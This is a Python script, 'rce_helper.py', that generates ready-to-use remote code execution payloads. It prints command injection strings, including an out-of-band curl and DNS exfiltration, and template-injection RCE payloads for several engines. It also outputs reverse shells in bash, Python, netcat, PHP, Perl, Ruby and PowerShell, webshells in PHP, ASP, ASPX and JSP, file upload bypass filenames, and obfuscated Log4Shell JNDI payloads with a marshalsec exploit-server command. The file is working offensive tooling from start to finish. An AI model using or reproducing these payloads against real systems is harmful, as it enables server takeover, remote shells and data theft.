#!/usr/bin/env python3
"""
rce_helper.py — RCE / Command Injection Helper

Usage:
    python3 rce_helper.py cmdi                        # command injection payloads
    python3 rce_helper.py ssti                        # SSTI detection + exploit payloads
    python3 rce_helper.py revshell bash YOUR-IP 4444  # generate reverse shell
    python3 rce_helper.py webshell php                # webshell code
    python3 rce_helper.py log4shell YOUR-SERVER       # log4shell payloads
    python3 rce_helper.py upload-bypass               # file upload bypass list
"""
import sys, base64, urllib.parse

CMDI_PAYLOADS = [
    ("; id",                    "semicolon"),
    ("| id",                    "pipe"),
    ("|| id",                   "OR pipe"),
    ("&& id",                   "AND"),
    ("& id",                    "background"),
    ("`id`",                    "backtick"),
    ("$(id)",                   "subshell"),
    ("%0a id",                  "newline (URL)"),
    ("%3b id",                  "semicolon (URL)"),
    ("; sleep 10",              "blind: sleep"),
    ("| sleep 10",              "blind: pipe sleep"),
    ("; curl http://YOUR-SERVER/$(id|base64)", "blind: OOB"),
    ("; nslookup $(whoami).YOUR-OAST-DOMAIN", "blind: DNS"),
]

SSTI_DETECT = [
    ("{{7*7}}", "49", "Jinja2 / Twig"),
    ("${7*7}", "49", "Freemarker / Velocity"),
    ("<%= 7*7 %>", "49", "ERB (Ruby)"),
    ("#{7*7}", "49", "Ruby string interp"),
    ("*{7*7}", "49", "Thymeleaf (Spring)"),
    ("{{7*'7'}}", "7777777", "Jinja2 (string multiply)"),
    ("{{'7'*7}}", "7777777", "Jinja2"),
]

SSTI_RCE = {
    "Jinja2 (Python)": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "Twig (PHP)": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
    ],
    "Freemarker (Java)": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
    "ERB (Ruby)": [
        "<%= `id` %>",
        "<%= system('id') %>",
    ],
    "Velocity (Java)": [
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($ex=$rt.getRuntime().exec('id'))",
    ],
}

REVSHELLS = {
    "bash": lambda ip, port: f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash_c": lambda ip, port: f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    "python3": lambda ip, port: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "netcat": lambda ip, port: f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "php": lambda ip, port: f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": lambda ip, port: f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "ruby": lambda ip, port: f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "powershell": lambda ip, port: f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
}

WEBSHELLS = {
    "php": '<?php system($_GET["cmd"]); ?>',
    "php_full": '<?php echo "<pre>" . shell_exec($_REQUEST["c"]) . "</pre>"; ?>',
    "php_obfuscated": '<?php $f=create_function(\'\',"return system(\\$_GET[0]);");$f(); ?>',
    "asp": '<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>',
    "aspx": '<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?null:null).ReadToEnd():""); %>',
    "jsp": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
}

UPLOAD_BYPASSES = [
    "shell.php", "shell.php5", "shell.php7", "shell.phtml", "shell.phar",
    "shell.phps", "shell.php.jpg", "shell.PHP", "shell.PhP",
    "shell.php%00.jpg", "shell.php;.jpg", "shell.jpg",
    ".htaccess (AddType application/x-httpd-php .jpg)",
]

LOG4SHELL_PAYLOADS = lambda server: [
    f"${{jndi:ldap://{server}:1389/exploit}}",
    f"${{jndi:ldaps://{server}/exploit}}",
    f"${{jndi:rmi://{server}/exploit}}",
    f"${{${{lower:j}}ndi:${{lower:l}}dap://{server}/exploit}}",
    f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{server}/exploit}}",
    f"${{j${{::-n}}di:ldap://{server}/exploit}}",
]

def show_cmdi():
    print("\n[+] Command Injection Payloads\n")
    for p, desc in CMDI_PAYLOADS:
        print(f"  [{desc:<25}] {p}")
    print()

def show_ssti():
    print("\n[+] SSTI Detection Payloads\n")
    print("  Inject these into every text field. Look for the math result in the response:\n")
    for payload, expected, engine in SSTI_DETECT:
        print(f"  Payload: {payload:<25}  Expected: {expected:<10}  Engine: {engine}")
    print("\n[+] SSTI RCE Payloads (once engine identified)\n")
    for engine, payloads in SSTI_RCE.items():
        print(f"  === {engine} ===")
        for p in payloads:
            print(f"  {p}")
        print()

def show_revshell(shell_type, ip, port):
    if shell_type == "all":
        print(f"\n[+] All reverse shells → {ip}:{port}\n")
        for name, fn in REVSHELLS.items():
            print(f"  === {name} ===")
            print(f"  {fn(ip, port)}\n")
    elif shell_type in REVSHELLS:
        print(f"\n[+] {shell_type} reverse shell → {ip}:{port}\n")
        print(f"  {REVSHELLS[shell_type](ip, port)}\n")
        b64 = base64.b64encode(REVSHELLS[shell_type](ip, port).encode()).decode()
        print(f"  Base64 encoded:\n  {b64}\n")
        print(f"  Listener:  nc -lvnp {port}\n")
    else:
        print(f"[!] Unknown shell type. Available: {', '.join(REVSHELLS.keys())}, all")

def show_webshell(lang):
    if lang in WEBSHELLS:
        print(f"\n[+] {lang} webshell\n")
        print(f"  {WEBSHELLS[lang]}\n")
        print(f"  Usage: /uploads/shell.{lang}?cmd=id\n")
    else:
        print(f"[!] Available: {', '.join(WEBSHELLS.keys())}")

def show_log4shell(server):
    print(f"\n[+] Log4Shell Payloads → {server}\n")
    print("  Inject in: User-Agent, X-Forwarded-For, Referer, username, email, any logged field\n")
    for p in LOG4SHELL_PAYLOADS(server):
        print(f"  {p}")
    print(f"\n  curl example:")
    print(f'  curl "https://target.com/login" -H "User-Agent: {LOG4SHELL_PAYLOADS(server)[0]}" -d "username=test&password=test"\n')
    print(f"  Exploit server (marshalsec):")
    print(f"  java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://{server}/#Exploit'\n")

def show_upload():
    print("\n[+] File Upload Bypass Filenames\n")
    for f in UPLOAD_BYPASSES:
        print(f"  {f}")
    print("\n  Also:")
    print("  - Change Content-Type to text/plain or image/jpeg while keeping .php ext")
    print("  - Prepend magic bytes: printf '\\xFF\\xD8\\xFF\\xE0' > shell.jpg && echo '<?php system($_GET[\"cmd\"]); ?>' >> shell.jpg")
    print()

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "cmdi":
        show_cmdi()
    elif cmd == "ssti":
        show_ssti()
    elif cmd == "revshell":
        t = args[1] if len(args) > 1 else "bash"
        ip = args[2] if len(args) > 2 else "YOUR-IP"
        port = args[3] if len(args) > 3 else "4444"
        show_revshell(t, ip, port)
    elif cmd == "webshell":
        lang = args[1] if len(args) > 1 else "php"
        show_webshell(lang)
    elif cmd == "log4shell":
        server = args[1] if len(args) > 1 else "YOUR-SERVER"
        show_log4shell(server)
    elif cmd == "upload-bypass":
        show_upload()
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
